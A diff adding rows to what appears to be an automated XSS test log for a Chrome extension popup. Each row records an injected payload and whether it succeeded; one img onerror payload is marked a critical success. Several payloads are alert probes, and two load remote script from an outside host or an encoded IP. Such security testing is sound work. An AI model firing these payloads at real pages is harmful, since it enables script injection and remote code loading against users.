@@ -22,3 +22,12 @@
 2023-06-09 00:55:23,024, 2023-06-09 00:55:23, Fail, Level <function info at 0x7f2a3defe950>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
 2023-06-09 00:55:23,229, 2023-06-09 00:55:23, Fail, Level <function info at 0x7f2a3defe950>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <script>alert(1)<!–
 2023-06-09 00:55:26,581, 2023-06-09 00:55:26, Fail, Level <function info at 0x7f2a3defe950>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-11 22:29:55,674, 2023-06-11 22:29:55, Success, CRITICAL, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 1, <img src=xss onerror=alert(1)>
+2023-06-11 22:29:58,165, 2023-06-11 22:29:58, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', test123
+2023-06-11 22:29:58,199, 2023-06-11 22:29:58, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', blaoejds222
+2023-06-11 22:29:59,469, 2023-06-11 22:29:59, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <script src=//brutelogic.com.br/1.js>
+2023-06-11 22:30:01,773, 2023-06-11 22:30:01, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-11 22:30:01,846, 2023-06-11 22:30:01, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-11 22:30:03,007, 2023-06-11 22:30:02, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
+2023-06-11 22:30:05,499, 2023-06-11 22:30:05, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-11 22:30:05,576, 2023-06-11 22:30:05, Fail, Level <function info at 0x7fb48bddb760>, chrome-extension://knjiakannokigchafmfahcedoafdlbei/popup.html, 'NIL', <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1)</a:script>
